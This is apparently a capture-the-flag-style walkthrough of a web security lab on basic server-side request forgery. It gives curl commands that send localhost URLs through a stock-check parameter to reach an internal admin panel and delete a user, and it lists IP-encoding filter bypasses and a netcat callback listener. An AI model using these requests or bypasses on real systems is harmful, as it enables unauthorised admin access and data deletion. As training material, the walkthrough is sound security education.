# Walkthrough: Basic SSRF Against the Local Server

> Replace `<LAB-ID>` and `<SESSION>` with your own lab instance values throughout.

## 1. Capture the original request

1. Open the lab, go to any product page.
2. Open **DevTools** (`F12`) → **Network** tab → filter by **Fetch/XHR**.
3. Click **"Check stock."**
4. Select the resulting request to `/product/stock`. Note:
   - **Request body:** `stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1`
   - **Cookie header:** `session=<SESSION>`

This confirms the frontend sends a URL to the backend, which the backend then fetches on the client's behalf.

## 2. Confirm the SSRF — reach the internal admin panel

```bash
curl -i https://<LAB-ID>.web-security-academy.net/product/stock \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -b 'session=<SESSION>' \
  --data-raw 'stockApi=http://localhost/admin'
```

**Result:** The response body contains the full admin panel HTML — even though this endpoint is not directly reachable from outside the server's own network. The server performed the request as `localhost`, which the app implicitly trusts.

> Note: the parameter name is case-sensitive — `stockApi`, not `stockAPI`. Sending the wrong case returns:
> `"Missing parameter 'stockApi'"`

## 3. Extract the delete-user link

Rather than scrolling raw HTML, grep for the target user directly:

```bash
curl -s https://<LAB-ID>.web-security-academy.net/product/stock \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -b 'session=<SESSION>' \
  --data-raw 'stockApi=http://localhost/admin' \
  | grep -o 'href="[^"]*carlos[^"]*"'
```

This returns the exact path used by the admin panel's delete action, e.g.:
```
href="/admin/delete?username=carlos"
```

*(Optional — view it rendered instead of raw text:)*
```bash
curl -s ... --data-raw 'stockApi=http://localhost/admin' -o admin.html
xdg-open admin.html   # or: open admin.html (macOS) / start admin.html (Windows)
```

## 4. Trigger the delete via SSRF

```bash
curl -i https://<LAB-ID>.web-security-academy.net/product/stock \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -b 'session=<SESSION>' \
  --data-raw 'stockApi=http://localhost/admin/delete?username=carlos'
```

The server fetches this URL itself, again appearing as a trusted local request, and executes the delete action.

## 5. Verify

Refresh the lab page — the status banner should flip to **"Solved."**

---

## Key takeaways

- **SSRF borrows the server's trust.** The vulnerability isn't that `/admin` exists — it's that access control was based on network origin (`localhost`) rather than real authentication.
- **No proxy tool required.** Chrome DevTools to capture the request shape + `curl` to replay/modify it is a fully functional substitute for Burp Repeater on labs like this one.
- **Watch parameter casing** when replaying captured requests by hand — a mismatch produces a generic "missing parameter" error that can look like the payload itself failed.
- **Session cookie is mandatory** on every curl call — curl has no browser state, so each request must carry `-b 'session=...'` to be treated as the authenticated/lab-tracked session.

## Related labs (same technique, harder filters)

| Lab | What's different |
|---|---|
| SSRF with blacklist-based input filter | Must bypass a deny-list (IP encoding: `127.1`, `2130706433`, `0x7f.0.0.1`, etc.) |
| SSRF with whitelist-based input filter | Must abuse URL-parsing quirks (`@` trick, open redirects) to pass an allow-list check |
| Blind SSRF with out-of-band detection | No response body returned — confirmed via callback to an external listener (e.g. Burp Collaborator, or a self-hosted `ngrok` + `nc -lvp` listener) |
